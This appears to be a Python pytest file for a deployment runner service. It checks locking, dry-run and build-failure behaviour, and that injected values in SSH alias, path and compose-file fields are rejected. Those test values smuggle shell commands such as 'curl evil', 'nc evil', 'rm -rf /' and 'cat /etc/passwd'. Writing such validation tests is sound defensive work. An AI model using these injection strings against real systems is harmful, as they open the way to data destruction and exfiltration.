import asyncio

import pytest

from app.services.ops_runner import OpsRunner
from app.services.ops_validation import OpsValidationError


class _Dest:
    id = "t"
    ssh_alias = "flt"
    remote_base = "/root/project"
    compose_file = "docker-compose.alocalizai.yml"
    front_api_url = "https://core.x/v1/"
    image_registry = "ghcr.io/x"
    image_tag = "t"


def _dest(**overrides):
    d = _Dest()
    for k, v in overrides.items():
        setattr(d, k, v)
    return d


@pytest.mark.asyncio
async def test_lock_rejects_second_run(monkeypatch):
    r = OpsRunner()
    started = asyncio.Event()

    async def fake_stream(step, cmd, cwd=None, env=None):
        started.set()
        await asyncio.sleep(0.2)
        return 0

    monkeypatch.setattr(r, "_stream", fake_stream)
    await r.run(_Dest(), dry_run=True)
    await started.wait()
    assert r.is_running() is True
    with pytest.raises(RuntimeError):
        await r.run(_Dest(), dry_run=True)
    await asyncio.sleep(0.3)
    assert r.is_running() is False


@pytest.mark.asyncio
async def test_dry_run_skips_deploy(monkeypatch):
    r = OpsRunner()
    steps = []

    async def fake_stream(step, cmd, cwd=None, env=None):
        steps.append(step)
        return 0

    monkeypatch.setattr(r, "_stream", fake_stream)
    await r.run(_Dest(), dry_run=True)
    await asyncio.sleep(0.1)
    assert steps == ["build"]


@pytest.mark.asyncio
async def test_build_fail_skips_deploy(monkeypatch):
    r = OpsRunner()
    steps = []

    async def fake_stream(step, cmd, cwd=None, env=None):
        steps.append(step)
        return 1 if step == "build" else 0

    monkeypatch.setattr(r, "_stream", fake_stream)
    await r.run(_Dest(), dry_run=False)
    await asyncio.sleep(0.1)
    assert steps == ["build"]
    assert r.status()["step"] == "failed"


@pytest.mark.parametrize(
    "field,value",
    [
        ("ssh_alias", "flt; curl evil"),
        ("ssh_alias", "flt`whoami`"),
        ("ssh_alias", "flt | nc evil 1"),
        ("ssh_alias", "flt $(id)"),
        ("ssh_alias", "flt evil"),
        ("ssh_alias", ""),
        ("remote_base", "/root/project; rm -rf /"),
        ("remote_base", "relative/path"),
        ("compose_file", "evil.yml; cat /etc/passwd"),
        ("compose_file", "notayaml"),
    ],
)
@pytest.mark.asyncio
async def test_run_rejects_invalid_destination(monkeypatch, field, value):
    """Re-validação no boundary do runner recusa linhas inválidas em runtime,
    independente de terem passado (ou não) pelo write-path Pydantic."""
    r = OpsRunner()
    called = False

    async def fake_stream(step, cmd, cwd=None, env=None):
        nonlocal called
        called = True
        return 0

    monkeypatch.setattr(r, "_stream", fake_stream)
    with pytest.raises(OpsValidationError):
        await r.run(_dest(**{field: value}), dry_run=False)
    await asyncio.sleep(0.05)
    assert called is False
    assert r.is_running() is False


@pytest.mark.asyncio
async def test_run_rejects_invalid_destination_even_on_dry_run(monkeypatch):
    """ssh_alias malicioso é recusado mesmo em dry_run (boundary, não só no ssh)."""
    r = OpsRunner()
    monkeypatch.setattr(r, "_stream", lambda *a, **k: (_ for _ in ()).throw(AssertionError()))
    with pytest.raises(OpsValidationError):
        await r.run(_dest(ssh_alias="flt; curl evil"), dry_run=True)
    assert r.is_running() is False
